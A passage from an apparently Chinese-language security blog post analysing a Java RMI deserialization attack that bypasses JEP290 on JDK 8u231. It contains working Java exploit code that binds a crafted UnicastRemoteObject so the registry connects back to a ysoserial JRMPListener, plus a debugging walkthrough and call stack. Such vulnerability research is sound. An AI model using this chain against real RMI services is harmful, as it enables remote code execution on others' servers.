class="comment">//3. RMIServerSocketFactory -&gt; UnicastRemoteObject</span></span><br><span class="line">    <span class="comment">//把RMIServerSocketFactory塞进UnicastRemoteObject实例中</span></span><br><span class="line">    ReflectionHelper.setFieldValue(remoteObject, <span class="string">&quot;ssf&quot;</span>, serverSocketFactory);</span><br><span class="line">    <span class="keyword">return</span> remoteObject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路是</p>
<blockquote>
<ol>
<li><strong>readobject递归反序列化到payload对象中的UnicastRef对象，填装UnicastRef对象的ref到<code>incomingRefTable</code></strong></li>
<li><strong>在根据readobject的第二个最著名的特性：会调用对象自实现的readobject方法，会执行UnicastRemoteObject的readObject，他的Gadgets会在这里触发一次JRMP请求</strong></li>
<li><strong>在releaseInputStream语句中从<code>incomingRefTable</code>中读取ref进行开始JRMP请求</strong></li>
</ol>
</blockquote>
<p>不过<code>RegistryImpl_Stub#</code>在序列化<code>UnicastRemoteObject</code>的时候，会出现问题</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241125151008549.png" class="" title="image-20241125151008549">

<p>在序列化的时候，会调用到<code>ObjectOutputStream#writeObject0</code>，</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241125151328857.png" class="" title="image-20241125151328857">

<p>因为这里<code>enableReplace</code>为true，所以会执行<code>replaceObject</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241125152112938.png" class="" title="image-20241125152112938">

<p>因为<code>UnicastRemoteObject</code>实现了<code>Remote</code>但是没有实现<code>RemoteStub</code>，而且<code>var2!=null</code>成立，所以最后会返回<code>var2.getStub()</code>，是一个<code>Proxy</code>对象</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241125154723247.png" class="" title="image-20241125154723247">

<p>被序列化的已经不是原来的<code>UnicasteRemoteObject</code>，那么在反序列化的时候自然也不会触发漏洞。这里解决的思路是重写<code>RegistryImpl_Stub#bind()</code>，把<code>enableReplace</code>改为true</p>
<p>整合后的Client端代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.StreamRemoteCall;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClientDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">tcpEndpoint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;localhost&quot;</span>,<span class="number">2333</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(objID, tcpEndpoint, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">UnicastRemoteObject</span> <span class="variable">unicastRemoteObject</span> <span class="operator">=</span> pack(ref);</span><br><span class="line">        bind(registry, unicastRemoteObject);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(Registry registry, UnicastRemoteObject unicastRemoteObject)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//获取ref</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">RemoteObjectClass</span> <span class="operator">=</span> registry.getClass().getSuperclass().getSuperclass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">refField</span> <span class="operator">=</span> RemoteObjectClass.getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        refField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> (UnicastRef)refField.get(registry);<span class="comment">//获取ref字段的值</span></span><br><span class="line">        <span class="comment">//获取operations</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">StubClass</span> <span class="operator">=</span> registry.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">operationsField</span> <span class="operator">=</span> StubClass.getDeclaredField(<span class="string">&quot;operations&quot;</span>);</span><br><span class="line">        operationsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Operation[] operations = (Operation[]) operationsField.get(registry);<span class="comment">//获取operations字段的值</span></span><br><span class="line"></span><br><span class="line">        <span class="type">StreamRemoteCall</span> <span class="variable">var3</span> <span class="operator">=</span> (StreamRemoteCall) ref.newCall((RemoteObject)registry, operations, <span class="number">2</span> , <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="type">ObjectOutput</span> <span class="variable">var4</span> <span class="operator">=</span> var3.getOutputStream();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">enableReplaceField</span> <span class="operator">=</span> ObjectOutputStream.class.getDeclaredField(<span class="string">&quot;enableReplace&quot;</span>);</span><br><span class="line">        enableReplaceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        enableReplaceField.set(var4, <span class="literal">false</span>);</span><br><span class="line">        var4.writeObject(unicastRemoteObject);</span><br><span class="line">        ref.invoke(var3);</span><br><span class="line">        ref.done(var3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> UnicastRemoteObject <span class="title function_">pack</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>((RemoteRef) obj);</span><br><span class="line">    <span class="type">RMIServerSocketFactory</span> <span class="variable">serverSocketFactory</span> <span class="operator">=</span> (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">        RMIServerSocketFactory.class.getClassLoader(),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; RMIServerSocketFactory.class, Remote.class&#125;, </span><br><span class="line">        handler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    Constructor&lt;?&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor(<span class="literal">null</span>); </span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">UnicastRemoteObject</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (UnicastRemoteObject) ((java.lang.reflect.Constructor&lt;?&gt;) constructor).newInstance(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> UnicastRemoteObject.class.getDeclaredField(<span class="string">&quot;ssf&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(remoteObject, serverSocketFactory);</span><br><span class="line">    <span class="keyword">return</span> remoteObject;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ysoserial开启<code>exploit/listener</code>，</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241125190638727.png" class="" title="image-20241125190638727">

<p>接下来再调试一遍，看看这条链子是怎么绕过JEP290发起JRMP请求的，前面就是<code>RegistryImpl_Skel#dispatch</code>中处理<code>bind</code>方法然后调用<code>readObject</code>，进而调用<code>UnicastRemoteObject#readObject</code></p>
<h4 id="UnicastRemoteObject-1"><a href="#UnicastRemoteObject-1" class="headerlink" title="UnicastRemoteObject"></a><code>UnicastRemoteObject</code></h4><img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241128132338812.png" class="" title="image-20241128132338812">

<p>然后再<code>UnicastRemoteObject#readObject</code>中调用<code>reexport</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241128132511134.png" class="" title="image-20241128132511134">

<p>进入到else分支后，调用<code>exportObject</code>，一直来到</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241128132820773.png" class="" title="image-20241128132820773">

<p>然后调用<code>UnicastRemoteObject#exportObject</code>，导出远程对象，注意这个<code>sref</code>的<code>ssf</code>字段我们已经设置为了<code>RMIServerSocketFactory</code>对象，最后一路来到<code>TCPTransport#exportObject</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241128133506279.png" class="" title="image-20241128133506279">

<p>我们进入<code>listen</code>方法</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241128134117786.png" class="" title="image-20241128134117786">

<p>然后来到231行，调用<code>TCPEndpoint#newServerSocket</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241128140126318.png" class="" title="image-20241128140126318">

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RMIServerSocketFactory</span> <span class="variable">serverSocketFactory</span> <span class="operator">=</span> (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">       RMIServerSocketFactory.class.getClassLoader(),<span class="comment">// classloader</span></span><br><span class="line">       <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; RMIServerSocketFactory.class, Remote.class&#125;, <span class="comment">// interfaces to implements</span></span><br><span class="line">       handler<span class="comment">// RemoteObjectInvocationHandler</span></span><br><span class="line">       );</span><br></pre></td></tr></table></figure>

<p>前面把<code>ssf</code>设置为<code>RemoteObjectInvocationHandler</code>生成的代理类了，所以当调用<code>ssf</code>的方法的时候，实际上调用到的是<code>RemoteObjectInvocationHandler#invoke()</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241129164121883.png" class="" title="image-20241129164121883">

<p>这里的<code>method</code>就是前面调用的<code>createServerSocket</code>，这里先检查<code>method</code>所在的类是否是<code>Object</code>类，如果不是则调用<code>invokeRemoteMethod</code>，因为<code>RemoteObjectInvocationHandler</code>实现了<code>Remote</code>接口，所以最后会调用<code>UnicastRef#invoke</code>。这里的ref存有<code>exploit/JRMPListener</code>的tcp信息</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241129164933019.png" class="" title="image-20241129164933019">

<h4 id="UnicastRef-invoke"><a href="#UnicastRef-invoke" class="headerlink" title="UnicastRef#invoke"></a><code>UnicastRef#invoke</code></h4><img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241129193605739.png" class="" title="image-20241129193605739">

<p>进入<code>UnicastRef#invoke</code>后，首先调用<code>newConnection</code>建立连接，这里是连接上<code>exploit/JRMPListener</code>（127.0.0.1:2333）</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241129195317525.png" class="" title="image-20241129195317525">

<p>然后<code>new StreamRemoteCall(var6, this.ref.getObjID(), -1, var4);</code>实例化一个<code>StreamRemoteCall</code>对象用于处理远程调用</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241129200950107.png" class="" title="image-20241129200950107">

<p>然后调获取输出流，并且用<code>marshaValue</code>将<code>Method var2</code>需要的参数序列化到输出流中，然后调用<code>StreamRemoteCall#executeCall</code></p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241129203041073.png" class="" title="image-20241129203041073">

<p>在<code>StreamRemoteCall#executeCall</code>会涉及反序列化操作，只要var1为case 2（<strong>注意这个case 2不是说var1&#x3D;&#x3D;2，这里的case 2实际上指的是case TransportConstants.ExceptionalReturn，这里的歧义应该是是反编译class包导致的，</strong>），就会对<code>/exploit/JRMPListener</code>的恶意序列化数据进行反序列化</p>
<p>var1的返回值具体取决于这一段：</p>
<img src="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241130110440220.png" class="" title="image-20241130110440220">

<p>如果server端反序列化正常，就会返回<code>TransportConstants.NormalReturn</code>否则返回<code>TransportConstants.ExceptionalReturn</code>。本质上就是如果服务端反序列化的时候抛出错误，就会执行<code>readObject</code>进行反序列化。</p>
<p>整个过程的调用栈如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">readObject:<span class="number">424</span>, ObjectInputStream (java.io) [<span class="number">2</span>]</span><br><span class="line">executeCall:<span class="number">270</span>, StreamRemoteCall (sun.rmi.transport)</span><br><span class="line">invoke:<span class="number">161</span>, UnicastRef (sun.rmi.server)</span><br><span class="line">invokeRemoteMethod:<span class="number">227</span>, RemoteObjectInvocationHandler (java.rmi.server)</span><br><span class="line">invoke:<span class="number">179</span>, RemoteObjectInvocationHandler (java.rmi.server)</span><br><span class="line">createServerSocket:-<span class="number">1</span>, $Proxy1 (com.sun.proxy)</span><br><span class="line">newServerSocket:<span class="number">666</span>, TCPEndpoint (sun.rmi.transport.tcp)</span><br><span class="line">listen:<span class="number">335</span>, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">exportObject:<span class="number">254</span>, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">exportObject:<span class="number">411</span>, TCPEndpoint (sun.rmi.transport.tcp)</span><br><span class="line">exportObject:<span class="number">147</span>, LiveRef (sun.rmi.transport)</span><br><span class="line">exportObject:<span class="number">237</span>, UnicastServerRef (sun.rmi.server)</span><br><span class="line">exportObject:<span class="number">383</span>, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">exportObject:<span class="number">346</span>, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">reexport:<span class="number">268</span>, UnicastRemoteObject (java.rmi.server)</span><br><span class="line">readObject:<span class="number">235</span>, UnicastRemoteObject (java.rmi.server)</span><br></pre></td></tr></table></figure>

<p>最后再来总结一下针对jdk8u231 Bypass JEP290的关键点：</p>
<ul>
<li>利用readObject执行<code>UnicastRemoteObject#readObject</code></li>
<li>利用动态代理的特性，执行代理对象的方法<code>createServerSocket</code>实际上会跳转到了<code>RemoteObjectInvocationHandler#invoke</code></li>
<li><code>RemoteObjectInvocationHandler#invoke</code>里通过调用内置的<code>UnicastRef</code>，向外发起JRMP连接请求，并反序列化返回的结果</li>
</ul>
<h1 id="0x04后记-参考文章"><a href="#0x04后记-参考文章" class="headerlink" title="0x04后记&amp;参考文章"></a>0x04后记&amp;参考文章</h1><p>在jdk8u241中，针对Bypass JEP290(jdk&#x3D;8u231)进行了修复，至此在jdk8u241之后针对RMI的反序列化攻击彻底落幕</p>
<p>摸着很多师傅的文章过河的，一些局限性比较强或者利用难度大的打法就没有涉及到了，下面是参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://threezh1.com/2020/12/19/JAVA_RMI_Learn/">https://threezh1.com/2020/12/19/JAVA_RMI_Learn/</a></p>
<p><a target="_blank" rel="noopener" href="https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1">RMI Bypass Jep290(Jdk8u231) 反序列化漏洞分析 - 360CERT</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1689/">漫谈 JEP 290 (seebug.org)</a></p>
<p><a target="_blank" rel="noopener" href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1251/">https://paper.seebug.org/1251/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7932">https://xz.aliyun.com/t/7932</a></p>
<p><a target="_blank" rel="noopener" href="https://halfblue.github.io/2021/11/02/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0/">https://halfblue.github.io/2021/11/02/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0/</a></p>

        </article>
        <section class="post-near">
            <ul>
                
                    <li>上一篇: 看完啦 (つд⊂)</li>
                
                
                    <li>下一篇: <a href="/2024/11/04/0xGame2024-week4/">0xGame2024 week4</a></li>
                
            </ul>
        </section>
        
            <section class="post-tags">
            <a class="-none-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a>
            </section>
        
    
        <section class="post-author">
        
            <figure class="author-avatar">
                <img src="https://gravatar.com/userimage/255640517/d60e38ce04bcad4f72b37aa8b3cb4727.jpeg?size=256" alt="N0tluS" />
            </figure>
        
            <div class="author-info">
                <h4>N0tluS</h4>
                <p>ovo</p>
            </div>
        </section>
    
    </div>
</main>

    <footer>
    <div class="buttons">
        <button class="to-top" href="#"></button>
    </div>
    <div class="wrap min">
        <section class="widget">
            <div class="row">
                <div class="col-m-4">
                    <h3 class="title-recent">最新文章：</h3>
                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2024/11/30/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">RMI反序列化</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/11/04/0xGame2024-week4/">0xGame2024 week4</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/10/31/Shiro-550%E5%88%86%E6%9E%90/">Shiro-550分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/10/27/0xGame2024-week3/">0xGame2024 week3</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/10/24/0xGame2024-week2/">0xGame2024 week2</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/10/24/0xGame2024-week1/">0xGame2024 week1</a></li></ul>
                </div>
                <div class="col-m-4">
                    <h3 class="title-date">时光机：</h3>
                    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li></ul>
                </div>
                <div class="col-m-4">
                    <h3 class="title-tags">标签云：</h3>
                    <a href="/tags/Java%E5%AE%89%E5%85%A8/" style="font-size: 20px;">Java安全</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a>
                </div>
            </div>
        </section>
        <section class="sub-footer">
            <p>© 2024 <a href="/">N0tluS.site</a>. All Rights Reserved. Theme By <a href="https://github.com/Dreamer-Paul/Hingle" target="_blank" rel="nofollow">Hingle</a>.</p>
        </section>
    </div>
</footer>


<script src="/static/kico.js"></script>
<script src="/static/hingle.js"></script>


<script>var hingle = new Paul_Hingle({"copyright":false,"night":true});</script>

  </body>
</html>
